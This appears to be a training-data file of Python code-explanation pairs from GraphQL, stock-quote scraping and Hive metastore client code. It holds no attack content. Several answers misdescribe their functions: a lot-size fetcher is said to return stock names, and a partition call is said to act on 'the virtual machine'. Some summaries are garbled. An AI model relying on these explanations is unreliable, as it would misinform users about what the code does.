{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_referenced_fields_and_fragment_names(\n    context: ValidationContext,\n    cached_fields_and_fragment_names: Dict,\n    fragment: FragmentDefinitionNode,\n) -> Tuple[NodeAndDefCollection, List[str]]:\n    \"\"\"Get referenced fields and nested fragment names\n\n    Given a reference to a fragment, return the represented collection of fields as well\n    as a list of nested fragment names referenced via fragment spreads.\n    \"\"\"\n    # Short-circuit building a type from the node if possible.\n    cached = cached_fields_and_fragment_names.get(fragment.selection_set)\n    if cached:\n        return cached\n\n    fragment_type = type_from_ast(context.schema, fragment.type_condition)\n    return get_fields_and_fragment_names(\n        context, cached_fields_and_fragment_names, fragment_type, fragment.selection_set\n    )", "response": "Given a reference to a fragment return the represented collection of fields as well\n    as a list of nested fragment names referenced via fragment spreads."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ncheck whether there are conflicts between two sub - fields.", "response": "def subfield_conflicts(\n    conflicts: List[Conflict], response_name: str, node1: FieldNode, node2: FieldNode\n) -> Optional[Conflict]:\n    \"\"\"Check whether there are conflicts between sub-fields.\n\n    Given a series of Conflicts which occurred between two sub-fields, generate a single\n    Conflict.\n    \"\"\"\n    if conflicts:\n        return (\n            (response_name, [conflict[0] for conflict in conflicts]),\n            list(chain([node1], *[conflict[1] for conflict in conflicts])),\n            list(chain([node2], *[conflict[2] for conflict in conflicts])),\n        )\n    return None"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef remove_listener(self, event_name, listener):\n        self.listeners[event_name].remove(listener)\n        return self", "response": "Removes a listener from the set of listeners."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ngets the field definition.", "response": "def get_field_def(\n    schema: GraphQLSchema, parent_type: GraphQLType, field_node: FieldNode\n) -> Optional[GraphQLField]:\n    \"\"\"Get field definition.\n\n    Not exactly the same as the executor's definition of `get_field_def()`, in this\n    statically evaluated environment we do not always have an Object type, and need\n    to handle Interface and Union types.\n    \"\"\"\n    name = field_node.name.value\n    if name == \"__schema\" and schema.query_type is parent_type:\n        return SchemaMetaFieldDef\n    if name == \"__type\" and schema.query_type is parent_type:\n        return TypeMetaFieldDef\n    if name == \"__typename\" and is_composite_type(parent_type):\n        return TypeNameMetaFieldDef\n    if is_object_type(parent_type) or is_interface_type(parent_type):\n        parent_type = cast(Union[GraphQLObjectType, GraphQLInterfaceType], parent_type)\n        return parent_type.fields.get(name)\n    return None"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nbuilding an IntrospectionQuery from a GraphQLSchema", "response": "def introspection_from_schema(\n    schema: GraphQLSchema, descriptions: bool = True\n) -> IntrospectionSchema:\n    \"\"\"Build an IntrospectionQuery from a GraphQLSchema\n\n    IntrospectionQuery is useful for utilities that care about type and field\n    relationships, but do not need to traverse through those relationships.\n\n    This is the inverse of build_client_schema. The primary use case is outside of the\n    server context, for instance when doing schema comparisons.\n    \"\"\"\n    query_ast = parse(get_introspection_query(descriptions))\n\n    from ..execution.execute import execute, ExecutionResult\n\n    result = execute(schema, query_ast)\n    if not isinstance(result, ExecutionResult):\n        raise RuntimeError(\"Introspection cannot be executed\")\n    if result.errors or not result.data:\n        raise result.errors[0] if result.errors else GraphQLError(\n            \"Introspection did not return a result\"\n        )\n    return result.data"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ngets a list of GraphQLError instances describing each deprecated use.", "response": "def find_deprecated_usages(\n    schema: GraphQLSchema, ast: DocumentNode\n) -> List[GraphQLError]:\n    \"\"\"Get a list of GraphQLError instances describing each deprecated use.\"\"\"\n\n    type_info = TypeInfo(schema)\n    visitor = FindDeprecatedUsages(type_info)\n    visit(ast, TypeInfoVisitor(type_info, visitor))\n    return visitor.errors"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nconverts from snake_case to CamelCase", "response": "def snake_to_camel(s, upper=True):\n    \"\"\"Convert from snake_case to CamelCase\n\n    If upper is set, then convert to upper CamelCase, otherwise the first character\n    keeps its case.\n    \"\"\"\n    s = _re_snake_to_camel.sub(lambda m: m.group(2).upper(), s)\n    if upper:\n        s = s[:1].upper() + s[1:]\n    return s"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nchecks whether this value is a valid scalar.", "response": "def is_valid_scalar(self, node: ValueNode) -> None:\n        \"\"\"Check whether this is a valid scalar.\n\n        Any value literal may be a valid representation of a Scalar, depending on that\n        scalar type.\n        \"\"\"\n        # Report any error at the full type expected by the location.\n        location_type = self.context.get_input_type()\n        if not location_type:\n            return\n\n        type_ = get_named_type(location_type)\n\n        if not is_scalar_type(type_):\n            self.report_error(\n                GraphQLError(\n                    bad_value_message(\n                        location_type,\n                        print_ast(node),\n                        enum_type_suggestion(type_, node),\n                    ),\n                    node,\n                )\n            )\n            return\n\n        # Scalars determine if a literal value is valid via `parse_literal()` which may\n        # throw or return an invalid value to indicate failure.\n        type_ = cast(GraphQLScalarType, type_)\n        try:\n            parse_result = type_.parse_literal(node)\n            if is_invalid(parse_result):\n                self.report_error(\n                    GraphQLError(\n                        bad_value_message(location_type, print_ast(node)), node\n                    )\n                )\n        except Exception as error:\n            # Ensure a reference to the original error is maintained.\n            self.report_error(\n                GraphQLError(\n                    bad_value_message(location_type, print_ast(node), str(error)),\n                    node,\n                    original_error=error,\n                )\n            )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef value_from_ast(\n    value_node: Optional[ValueNode],\n    type_: GraphQLInputType,\n    variables: Dict[str, Any] = None,\n) -> Any:\n    \"\"\"Produce a Python value given a GraphQL Value AST.\n\n    A GraphQL type must be provided, which will be used to interpret different GraphQL\n    Value literals.\n\n    Returns `INVALID` when the value could not be validly coerced according\n    to the provided type.\n\n    | GraphQL Value        | JSON Value    | Python Value |\n    | -------------------- | ------------- | ------------ |\n    | Input Object         | Object        | dict         |\n    | List                 | Array         | list         |\n    | Boolean              | Boolean       | bool         |\n    | String               | String        | str          |\n    | Int / Float          | Number        | int / float  |\n    | Enum Value           | Mixed         | Any          |\n    | NullValue            | null          | None         |\n\n    \"\"\"\n    if not value_node:\n        # When there is no node, then there is also no value.\n        # Importantly, this is different from returning the value null.\n        return INVALID\n\n    if is_non_null_type(type_):\n        if isinstance(value_node, NullValueNode):\n            return INVALID\n        type_ = cast(GraphQLNonNull, type_)\n        return value_from_ast(value_node, type_.of_type, variables)\n\n    if isinstance(value_node, NullValueNode):\n        return None  # This is explicitly returning the value None.\n\n    if isinstance(value_node, VariableNode):\n        variable_name = value_node.name.value\n        if not variables:\n            return INVALID\n        variable_value = variables.get(variable_name, INVALID)\n        if is_invalid(variable_value):\n            return INVALID\n        if variable_value is None and is_non_null_type(type_):\n            return INVALID\n        # Note: This does no further checking that this variable is correct.\n        # This assumes that this query has been validated and the variable usage here\n        # is of the correct type.\n        return variable_value\n\n    if is_list_type(type_):\n        type_ = cast(GraphQLList, type_)\n        item_type = type_.of_type\n        if isinstance(value_node, ListValueNode):\n            coerced_values: List[Any] = []\n            append_value = coerced_values.append\n            for item_node in value_node.values:\n                if is_missing_variable(item_node, variables):\n                    # If an array contains a missing variable, it is either coerced to\n                    # None or if the item type is non-null, it is considered invalid.\n                    if is_non_null_type(item_type):\n                        return INVALID\n                    append_value(None)\n                else:\n                    item_value = value_from_ast(item_node, item_type, variables)\n                    if is_invalid(item_value):\n                        return INVALID\n                    append_value(item_value)\n            return coerced_values\n        coerced_value = value_from_ast(value_node, item_type, variables)\n        if is_invalid(coerced_value):\n            return INVALID\n        return [coerced_value]\n\n    if is_input_object_type(type_):\n        if not isinstance(value_node, ObjectValueNode):\n            return INVALID\n        type_ = cast(GraphQLInputObjectType, type_)\n        coerced_obj: Dict[str, Any] = {}\n        fields = type_.fields\n        field_nodes = {field.name.value: field for field in value_node.fields}\n        for field_name, field in fields.items():\n            field_node = field_nodes.get(field_name)\n            if not field_node or is_missing_variable(field_node.value, variables):\n                if field.default_value is not INVALID:\n                    coerced_obj[field_name] = field.default_value\n                elif is_non_null_type(field.type):\n                    return INVALID\n                continue\n            field_value = value_from_ast(field_node.value, field.type, variables)\n            if is_invalid(field_value):\n                return INVALID\n            coerced_obj[field_name] = field_value\n        return coerced_obj\n\n    if is_enum_type(type_):\n        if not isinstance(value_node, EnumValueNode):\n            return INVALID\n        type_ = cast(GraphQLEnumType, type_)\n        enum_value = type_.values.get(value_node.value)\n        if not enum_value:\n            return INVALID\n        return enum_value.value\n\n    if is_scalar_type(type_):\n        # Scalars fulfill parsing a literal value via `parse_literal()`. Invalid values\n        # represent a failure to parse correctly, in which case INVALID is returned.\n        type_ = cast(GraphQLScalarType, type_)\n        try:\n            if variables:\n                result = type_.parse_literal(value_node, variables)\n            else:\n                result = type_.parse_literal(value_node)\n        except (ArithmeticError, TypeError, ValueError):\n            return INVALID\n        if is_invalid(result):\n            return INVALID\n        return result\n\n    # Not reachable. All possible input types have been considered.\n    raise TypeError(f\"Unexpected input type: '{inspect(type_)}'.\")", "response": "Produce a Python value given a GraphQL Value AST."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nchecks if value_node is a variable not defined in the variables dict.", "response": "def is_missing_variable(\n    value_node: ValueNode, variables: Dict[str, Any] = None\n) -> bool:\n    \"\"\"Check if `value_node` is a variable not defined in the `variables` dict.\"\"\"\n    return isinstance(value_node, VariableNode) and (\n        not variables or is_invalid(variables.get(value_node.name.value, INVALID))\n    )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef is_integer(value: Any) -> bool:\n    return (isinstance(value, int) and not isinstance(value, bool)) or (\n        isinstance(value, float) and isfinite(value) and int(value) == value\n    )", "response": "Return true if a value is an integer number."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nchecking if the variable is allowed in the given location.", "response": "def allowed_variable_usage(\n    schema: GraphQLSchema,\n    var_type: GraphQLType,\n    var_default_value: Optional[ValueNode],\n    location_type: GraphQLType,\n    location_default_value: Any,\n) -> bool:\n    \"\"\"Check for allowed variable usage.\n\n    Returns True if the variable is allowed in the location it was found, which includes\n    considering if default values exist for either the variable or the location at which\n    it is located.\n    \"\"\"\n    if is_non_null_type(location_type) and not is_non_null_type(var_type):\n        has_non_null_variable_default_value = var_default_value and not isinstance(\n            var_default_value, NullValueNode\n        )\n        has_location_default_value = location_default_value is not INVALID\n        if not has_non_null_variable_default_value and not has_location_default_value:\n            return False\n        location_type = cast(GraphQLNonNull, location_type)\n        nullable_location_type = location_type.of_type\n        return is_type_sub_type_of(schema, var_type, nullable_location_type)\n    return is_type_sub_type_of(schema, var_type, location_type)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef is_schema_of_common_names(schema: GraphQLSchema) -> bool:\n    query_type = schema.query_type\n    if query_type and query_type.name != \"Query\":\n        return False\n\n    mutation_type = schema.mutation_type\n    if mutation_type and mutation_type.name != \"Mutation\":\n        return False\n\n    subscription_type = schema.subscription_type\n    if subscription_type and subscription_type.name != \"Subscription\":\n        return False\n\n    return True", "response": "Check whether this schema uses common names convention."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef print_value(value: Any, type_: GraphQLInputType) -> str:\n    return print_ast(ast_from_value(value, type_))", "response": "Convenience function for printing a Python value."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\njoining a list of strings together by a given separator.", "response": "def join(strings: Optional[Sequence[str]], separator: str = \"\") -> str:\n    \"\"\"Join strings in a given sequence.\n\n    Return an empty string if it is None or empty, otherwise join all items together\n    separated by separator if provided.\n    \"\"\"\n    return separator.join(s for s in strings if s) if strings else \"\""}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nwraps string inside other strings at start and end.", "response": "def wrap(start: str, string: str, end: str = \"\") -> str:\n    \"\"\"Wrap string inside other strings at start and end.\n\n    If the string is not None or empty, then wrap with start and end, otherwise return\n    an empty string.\n    \"\"\"\n    return f\"{start}{string}{end}\" if string else \"\""}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef has_multiline_items(maybe_list: Optional[Sequence[str]]):\n    return maybe_list and any(is_multiline(item) for item in maybe_list)", "response": "Check whether one of the items in the list has multiple lines."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_middleware_resolvers(middlewares: Tuple[Any, ...]) -> Iterator[Callable]:\n    for middleware in middlewares:\n        if isfunction(middleware):\n            yield middleware\n        else:  # middleware provided as object with 'resolve' method\n            resolver_func = getattr(middleware, \"resolve\", None)\n            if resolver_func is not None:\n                yield resolver_func", "response": "Get a list of resolver functions from a list of classes or functions."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nwrapping the provided resolver with the middleware.", "response": "def get_field_resolver(\n        self, field_resolver: GraphQLFieldResolver\n    ) -> GraphQLFieldResolver:\n        \"\"\"Wrap the provided resolver with the middleware.\n\n        Returns a function that chains the middleware functions with the provided\n        resolver function.\n        \"\"\"\n        if self._middleware_resolvers is None:\n            return field_resolver\n        if field_resolver not in self._cached_resolvers:\n            self._cached_resolvers[field_resolver] = reduce(\n                lambda chained_fns, next_fn: partial(next_fn, chained_fns),\n                self._middleware_resolvers,\n                field_resolver,\n            )\n        return self._cached_resolvers[field_resolver]"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef type_map_reducer(map_: TypeMap, type_: GraphQLNamedType = None) -> TypeMap:\n    if not type_:\n        return map_\n    if is_wrapping_type(type_):\n        return type_map_reducer(\n            map_, cast(GraphQLWrappingType[GraphQLNamedType], type_).of_type\n        )\n    name = type_.name\n    if name in map_:\n        if map_[name] is not type_:\n            raise TypeError(\n                \"Schema must contain uniquely named types but contains multiple\"\n                f\" types named {name!r}.\"\n            )\n        return map_\n    map_[name] = type_\n\n    if is_union_type(type_):\n        type_ = cast(GraphQLUnionType, type_)\n        map_ = type_map_reduce(type_.types, map_)\n\n    if is_object_type(type_):\n        type_ = cast(GraphQLObjectType, type_)\n        map_ = type_map_reduce(type_.interfaces, map_)\n\n    if is_object_type(type_) or is_interface_type(type_):\n        for field in cast(GraphQLInterfaceType, type_).fields.values():\n            args = field.args\n            if args:\n                types = [arg.type for arg in args.values()]\n                map_ = type_map_reduce(types, map_)\n            map_ = type_map_reducer(map_, field.type)\n\n    if is_input_object_type(type_):\n        for field in cast(GraphQLInputObjectType, type_).fields.values():\n            map_ = type_map_reducer(map_, field.type)\n\n    return map_", "response": "Reducer function for creating the type map from given types."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nreduce function for creating the type map from given directives.", "response": "def type_map_directive_reducer(\n    map_: TypeMap, directive: GraphQLDirective = None\n) -> TypeMap:\n    \"\"\"Reducer function for creating the type map from given directives.\"\"\"\n    # Directives are not validated until validate_schema() is called.\n    if not is_directive(directive):\n        return map_\n    directive = cast(GraphQLDirective, directive)\n    return reduce(\n        lambda prev_map, arg: type_map_reducer(prev_map, arg.type),  # type: ignore\n        directive.args.values(),\n        map_,\n    )"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get_possible_types(\n        self, abstract_type: GraphQLAbstractType\n    ) -> Sequence[GraphQLObjectType]:\n        \"\"\"Get list of all possible concrete types for given abstract type.\"\"\"\n        if is_union_type(abstract_type):\n            abstract_type = cast(GraphQLUnionType, abstract_type)\n            return abstract_type.types\n        return self._implementations[abstract_type.name]", "response": "Get list of all possible concrete types for given abstract type."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef is_possible_type(\n        self, abstract_type: GraphQLAbstractType, possible_type: GraphQLObjectType\n    ) -> bool:\n        \"\"\"Check whether a concrete type is possible for an abstract type.\"\"\"\n        possible_type_map = self._possible_type_map\n        try:\n            possible_type_names = possible_type_map[abstract_type.name]\n        except KeyError:\n            possible_types = self.get_possible_types(abstract_type)\n            possible_type_names = {type_.name for type_ in possible_types}\n            possible_type_map[abstract_type.name] = possible_type_names\n        return possible_type.name in possible_type_names", "response": "Check whether a concrete type is possible for an abstract type."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef byte_adaptor(fbuffer):\n    if six.PY3:\n        strings = fbuffer.read().decode('latin-1')\n        fbuffer = six.StringIO(strings)\n        return fbuffer\n    else:\n        return fbuffer", "response": "provides py3 compatibility by converting byte based file stream to string based file stream"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef js_adaptor(buffer):\n    buffer = re.sub('true', 'True', buffer)\n    buffer = re.sub('false', 'False', buffer)\n    buffer = re.sub('none', 'None', buffer)\n    buffer = re.sub('NaN', '\"NaN\"', buffer)\n    return buffer", "response": "convert javascript objects like true False None NaN etc. to\n    quoted word"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_fno_lot_sizes(self, cached=True, as_json=False):\n        url = self.fno_lot_size_url\n        req = Request(url, None, self.headers)\n        res_dict = {}\n        if cached is not True or self.__CODECACHE__ is None:\n            # raises HTTPError and URLError\n            res = self.opener.open(req)\n            if res is not None:\n                # for py3 compat covert byte file like object to\n                # string file like object\n                res = byte_adaptor(res)\n                for line in res.read().split('\\n'):\n                    if line != '' and re.search(',', line) and (line.casefold().find('symbol') == -1):\n                        (code, name) = [x.strip() for x in line.split(',')[1:3]]\n                        res_dict[code] = int(name)\n                    # else just skip the evaluation, line may not be a valid csv\n            else:\n                raise Exception('no response received')\n            self.__CODECACHE__ = res_dict\n        return self.render_response(self.__CODECACHE__, as_json)", "response": "Returns a dictionary with key as stock code and value as stock name."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef get_stock_codes(self, cached=True, as_json=False):\n        url = self.stocks_csv_url\n        req = Request(url, None, self.headers)\n        res_dict = {}\n        if cached is not True or self.__CODECACHE__ is None:\n            # raises HTTPError and URLError\n            res = self.opener.open(req)\n            if res is not None:\n                # for py3 compat covert byte file like object to\n                # string file like object\n                res = byte_adaptor(res)\n                for line in res.read().split('\\n'):\n                    if line != '' and re.search(',', line):\n                        (code, name) = line.split(',')[0:2]\n                        res_dict[code] = name\n                    # else just skip the evaluation, line may not be a valid csv\n            else:\n                raise Exception('no response received')\n            self.__CODECACHE__ = res_dict\n        return self.render_response(self.__CODECACHE__, as_json)", "response": "Returns a dictionary with key as stock code and value as stock name."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nchecking if a stock code is valid", "response": "def is_valid_code(self, code):\n        \"\"\"\n        :param code: a string stock code\n        :return: Boolean\n        \"\"\"\n        if code:\n            stock_codes = self.get_stock_codes()\n            if code.upper() in stock_codes.keys():\n                return True\n            else:\n                return False"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nget the quote for a given stock code", "response": "def get_quote(self, code, as_json=False):\n        \"\"\"\n        gets the quote for a given stock code\n        :param code:\n        :return: dict or None\n        :raises: HTTPError, URLError\n        \"\"\"\n        code = code.upper()\n        if self.is_valid_code(code):\n            url = self.build_url_for_quote(code)\n            req = Request(url, None, self.headers)\n            # this can raise HTTPError and URLError, but we are not handling it\n            # north bound APIs should use it for exception handling\n            res = self.opener.open(req)\n\n            # for py3 compat covert byte file like object to\n            # string file like object\n            res = byte_adaptor(res)\n            res = res.read()\n            # Now parse the response to get the relevant data\n            match = re.search(\\\n                        r'<div\\s+id=\"responseDiv\"\\s+style=\"display:none\">(.*?)</div>',\n                        res, re.S\n                    )\n            try:\n                buffer = match.group(1).strip()\n                # commenting following two lines because now we are not using ast and instead\n                # relying on json's ability to do parsing. Should be much faster and more\n                # reliable. \n                #buffer = js_adaptor(buffer)\n                #response = self.clean_server_response(ast.literal_eval(buffer)['data'][0])\n                response = self.clean_server_response(json.loads(buffer)['data'][0])\n            except SyntaxError as err:\n                raise Exception('ill formatted response')\n            else:\n                return self.render_response(response, as_json)\n        else:\n            return None"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreturn a list of dictionaries containing the top gainers of the day", "response": "def get_top_gainers(self, as_json=False):\n        \"\"\"\n        :return: a list of dictionaries containing top gainers of the day\n        \"\"\"\n        url = self.top_gainer_url\n        req = Request(url, None, self.headers)\n        # this can raise HTTPError and URLError\n        res = self.opener.open(req)\n        # for py3 compat covert byte file like object to\n        # string file like object\n        res = byte_adaptor(res)\n        res_dict = json.load(res)\n        # clean the output and make appropriate type conversions\n        res_list = [self.clean_server_response(item) for item in res_dict['data']]\n        return self.render_response(res_list, as_json)"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns a list of dictionaries with advance declines data", "response": "def get_advances_declines(self, as_json=False):\n        \"\"\"\n        :return: a list of dictionaries with advance decline data\n        :raises: URLError, HTTPError\n        \"\"\"\n        url = self.advances_declines_url\n        req = Request(url, None, self.headers)\n        # raises URLError or HTTPError\n        resp = self.opener.open(req)\n        # for py3 compat covert byte file like object to\n        # string file like object\n        resp = byte_adaptor(resp)\n        resp_dict = json.load(resp)\n        resp_list = [self.clean_server_response(item)\n                     for item in resp_dict['data']]\n        return self.render_response(resp_list, as_json)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_index_list(self, as_json=False):\n\n        url = self.index_url\n        req = Request(url, None, self.headers)\n        # raises URLError or HTTPError\n        resp = self.opener.open(req)\n        resp = byte_adaptor(resp)\n        resp_list = json.load(resp)['data']\n        index_list = [str(item['name']) for item in resp_list]\n        return self.render_response(index_list, as_json)", "response": "get list of indices and codes\n       "}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef is_valid_index(self, code):\n        index_list = self.get_index_list()\n        return True if code.upper() in index_list else False", "response": "returns True | Flase based on whether code is valid"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nreturn a dict | json quote for the given index code", "response": "def get_index_quote(self, code, as_json=False):\n        \"\"\"\n        params:\n            code : string index code\n            as_json: True|False\n        returns:\n            a dict | json quote for the given index\n        \"\"\"\n        url = self.index_url\n        if self.is_valid_index(code):\n            req = Request(url, None, self.headers)\n            # raises HTTPError and URLError\n            resp = self.opener.open(req)\n            resp = byte_adaptor(resp)\n            resp_list = json.load(resp)['data']\n            # this is list of dictionaries\n            resp_list = [self.clean_server_response(item)\n                         for item in resp_list]\n            # search the right list element to return\n            search_flag = False\n            for item in resp_list:\n                if item['name'] == code.upper():\n                    search_flag = True\n                    break\n            return self.render_response(item, as_json) if search_flag else None"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nbuilds a url which can be requested for a given stock code.", "response": "def build_url_for_quote(self, code):\n        \"\"\"\n        builds a url which can be requested for a given stock code\n        :param code: string containing stock code.\n        :return: a url object\n        \"\"\"\n        if code is not None and type(code) is str:\n            encoded_args = urlencode([('symbol', code), ('illiquid', '0'), ('smeFlag', '0'), ('itpFlag', '0')])\n            return self.get_quote_url + encoded_args\n        else:\n            raise Exception('code must be string')"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef clean_server_response(self, resp_dict):\n\n        # change all the keys from unicode to string\n        d = {}\n        for key, value in resp_dict.items():\n            d[str(key)] = value\n        resp_dict = d\n        for key, value in resp_dict.items():\n            if type(value) is str or isinstance(value, six.string_types):\n                if re.match('-', value):\n                    try:\n                        if float(value) or int(value):\n                            dataType = True\n                    except ValueError:\n                        resp_dict[key] = None\n                elif re.search(r'^[0-9,.]+$', value):\n                    # replace , to '', and type cast to int\n                    resp_dict[key] = float(re.sub(',', '', value))\n                else:\n                    resp_dict[key] = str(value)\n        return resp_dict", "response": "cleans the server response by replacing - and - to None and int to 1000 and returns the dict with all above substitution\n       "}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ntakes date and return bhavcopy url", "response": "def get_bhavcopy_url(self, d):\n        \"\"\"take date and return bhavcopy url\"\"\"\n        d = parser.parse(d).date()\n        day_of_month = d.strftime(\"%d\")\n        mon = d.strftime(\"%b\").upper()\n        year = d.year\n        url = self.bhavcopy_base_url % (year, mon, day_of_month, mon, year)\n        return url"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef download_bhavcopy(self, d):\n        # ex_url = \"https://www.nseindia.com/content/historical/EQUITIES/2011/NOV/cm08NOV2011bhav.csv.zip\"\n        url = self.get_bhavcopy_url(d)\n        filename = self.get_bhavcopy_filename(d)\n        # response = requests.get(url, headers=self.headers)\n        response = self.opener.open(Request(url, None, self.headers))\n        zip_file_handle = io.BytesIO(response.read())\n        zf = zipfile.ZipFile(zip_file_handle)\n        try:\n            result = zf.read(filename)\n        except KeyError:\n            result = zf.read(zf.filelist[0].filename)\n\n        return result", "response": "returns bhavcopy as csv file"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef setMetaConf(self, key, value):\n    self.send_setMetaConf(key, value)\n    self.recv_setMetaConf()", "response": "Sets the meta configuration of the specified key to the given value."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get_fields(self, db_name, table_name):\n    self.send_get_fields(db_name, table_name)\n    return self.recv_get_fields()", "response": "This method is used to get the fields of a table in a database."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef get_fields_with_environment_context(self, db_name, table_name, environment_context):\n    self.send_get_fields_with_environment_context(db_name, table_name, environment_context)\n    return self.recv_get_fields_with_environment_context()", "response": "This method is used to get the fields from a table in a database."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_schema(self, db_name, table_name):\n    self.send_get_schema(db_name, table_name)\n    return self.recv_get_schema()", "response": "This method is used to get the schema of a table in a database."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_schema_with_environment_context(self, db_name, table_name, environment_context):\n    self.send_get_schema_with_environment_context(db_name, table_name, environment_context)\n    return self.recv_get_schema_with_environment_context()", "response": "This method is used to get the schema of a table in a database with a specific environment context."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef create_table_with_constraints(self, tbl, primaryKeys, foreignKeys):\n    self.send_create_table_with_constraints(tbl, primaryKeys, foreignKeys)\n    self.recv_create_table_with_constraints()", "response": "This method is used to create a table in the database."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ndropping a table from the database.", "response": "def drop_table(self, dbname, name, deleteData):\n    \"\"\"\n    Parameters:\n     - dbname\n     - name\n     - deleteData\n    \"\"\"\n    self.send_drop_table(dbname, name, deleteData)\n    self.recv_drop_table()"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_table_meta(self, db_patterns, tbl_patterns, tbl_types):\n    self.send_get_table_meta(db_patterns, tbl_patterns, tbl_types)\n    return self.recv_get_table_meta()", "response": "This method is used to get the metadata of a table."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_table_objects_by_name(self, dbname, tbl_names):\n    self.send_get_table_objects_by_name(dbname, tbl_names)\n    return self.recv_get_table_objects_by_name()", "response": "This method is used to get table objects by table names."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef get_table_names_by_filter(self, dbname, filter, max_tables):\n    self.send_get_table_names_by_filter(dbname, filter, max_tables)\n    return self.recv_get_table_names_by_filter()", "response": "This method is used to get the list of table names that match the filter."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef alter_table_with_cascade(self, dbname, tbl_name, new_tbl, cascade):\n    self.send_alter_table_with_cascade(dbname, tbl_name, new_tbl, cascade)\n    self.recv_alter_table_with_cascade()", "response": "This function is used to send an alter table request to the server to change the cascade of the table."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef add_partition_with_environment_context(self, new_part, environment_context):\n    self.send_add_partition_with_environment_context(new_part, environment_context)\n    return self.recv_add_partition_with_environment_context()", "response": "This method is used to add a new partition to the virtual machine."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef append_partition(self, db_name, tbl_name, part_vals):\n    self.send_append_partition(db_name, tbl_name, part_vals)\n    return self.recv_append_partition()", "response": "This method appends a partition to the list of partitions in the database."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef drop_partition(self, db_name, tbl_name, part_vals, deleteData):\n    self.send_drop_partition(db_name, tbl_name, part_vals, deleteData)\n    return self.recv_drop_partition()", "response": "This function is used to drop a partition from a table."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef drop_partition_with_environment_context(self, db_name, tbl_name, part_vals, deleteData, environment_context):\n    self.send_drop_partition_with_environment_context(db_name, tbl_name, part_vals, deleteData, environment_context)\n    return self.recv_drop_partition_with_environment_context()", "response": "This function is called by the server to drop a partition from the database with the specified values."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_partition(self, db_name, tbl_name, part_vals):\n    self.send_get_partition(db_name, tbl_name, part_vals)\n    return self.recv_get_partition()", "response": "This method is used to get the partition of a table."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef exchange_partition(self, partitionSpecs, source_db, source_table_name, dest_db, dest_table_name):\n    self.send_exchange_partition(partitionSpecs, source_db, source_table_name, dest_db, dest_table_name)\n    return self.recv_exchange_partition()", "response": "This method is used to send and receive exchange partitions to the server."}
